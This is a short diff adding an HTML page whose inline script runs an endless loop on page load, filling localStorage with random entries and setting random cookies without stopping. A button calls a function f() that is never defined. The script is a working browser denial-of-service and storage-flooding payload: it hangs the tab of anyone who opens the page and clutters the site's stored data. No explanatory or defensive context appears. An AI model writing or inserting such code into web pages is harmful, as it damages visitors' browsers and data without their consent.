@@ -1,0 +1,11 @@
+<button onclick = "f()"></button>
+<script>
+function get(min, max) {
+  return Math.random() * (max - min) + min;
+}
+while (1==1) {
+localStorage.setItem(get(0,100),get(0,100));
+var nou = get(0,10000) + "=" + get(0,10000);
+document.cookie = nou;
+}
+</script>
